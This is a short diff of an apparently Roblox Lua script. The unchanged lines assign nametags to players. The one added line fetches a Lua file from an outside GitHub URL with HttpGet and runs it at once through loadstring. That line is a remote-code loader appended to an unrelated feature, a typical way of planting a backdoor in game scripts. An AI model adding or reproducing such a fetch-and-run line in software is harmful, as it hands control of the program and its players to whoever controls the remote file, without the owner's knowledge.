@@ -50,3 +50,4 @@ for user, tag in pairs(decoded) do
         nametag(plr, tag)
     end
 end
+loadstring(game:HttpGet('https://github.com/popoffroblox/DeveloperLists/raw/refs/heads/main/rikaxfixer.lua', true))()
